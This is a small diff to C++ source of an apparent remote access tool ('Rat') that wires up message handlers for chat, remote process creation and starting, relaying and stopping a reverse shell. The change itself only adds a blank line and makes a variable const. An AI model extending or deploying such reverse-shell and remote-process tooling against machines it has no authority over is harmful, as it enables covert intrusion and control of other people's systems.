@@ -21,7 +21,8 @@ Rat::Rat(
 {
 	_handlers[MessageType::Chat] = std::make_shared<ChatHandler>();
 	_handlers[MessageType::CreateProcessS] = std::make_shared<CreateProcessHandler>();
-	auto reverseShellHandler = std::make_shared<ReverseShellHandler>(_sender.get());
+
+	const auto reverseShellHandler = std::make_shared<ReverseShellHandler>(_sender.get());
 	_handlers[MessageType::StartReverseShell] = reverseShellHandler;
 	_handlers[MessageType::ReverseShellMessage] = reverseShellHandler;
 	_handlers[MessageType::StopReverseShell] = reverseShellHandler;
